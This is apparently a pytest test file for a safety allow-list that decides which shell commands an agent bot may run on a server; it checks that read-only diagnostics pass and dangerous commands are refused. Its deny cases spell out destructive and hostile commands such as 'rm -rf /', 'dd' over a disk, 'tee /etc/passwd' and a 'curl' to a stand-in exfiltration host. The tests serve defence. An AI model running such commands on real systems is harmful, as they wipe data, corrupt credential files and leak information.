"""Safety command policy — allow-list behaviour (Fase 0)."""

from __future__ import annotations

import shlex

import pytest

from app.safety.policy import validate_args


def _ok(cmd: str) -> bool:
    allowed, _ = validate_args(shlex.split(cmd))
    return allowed


# ── Read-only diagnostik: DIIZINKAN ───────────────────────────────────────────
@pytest.mark.parametrize("cmd", [
    "ls -la /var/log",
    "df -h",
    "free -m",
    "ps aux",
    "grep -r error /var/log",
    "journalctl -u nginx --no-pager",
    "docker ps -a",
    "docker logs aiagent_bot",
    "docker compose ps",
    "git status",
    "git log --oneline -5",
    "systemctl status nginx",
    "cat /etc/hostname",
])
def test_readonly_commands_allowed(cmd: str) -> None:
    assert _ok(cmd) is True


# ── Destruktif / mutasi / jaringan: DITOLAK (lubang deny-list lama) ────────────
@pytest.mark.parametrize("cmd", [
    "rm -r /home/ali/project",          # rm -r (lolos di deny-list lama)
    "rm -rf /",
    "rm --recursive --force /data",     # long-form (lolos di deny-list lama)
    "systemctl stop cloudflared",       # dilarang keras oleh VPS
    "systemctl restart nginx",
    "docker rm -f web",
    "docker stop aiagent_bot",
    "docker compose down",
    "git push --force",
    "git reset --hard origin/main",
    "curl http://evil.example/exfil",   # jaringan keluar
    "wget http://x/y",
    "bash -c 'echo pwned'",
    "python3 -c 'import os'",
    "sudo reboot",
    "chmod -R 777 /",
    "tee /etc/passwd",
    "dd if=/dev/zero of=/dev/sda",
])
def test_dangerous_commands_denied(cmd: str) -> None:
    assert _ok(cmd) is False


def test_empty_command_denied() -> None:
    allowed, reason = validate_args([])
    assert allowed is False
    assert reason


def test_path_prefixed_executable_resolved() -> None:
    assert _ok("/usr/bin/df -h") is True
    assert _ok("/bin/systemctl stop x") is False
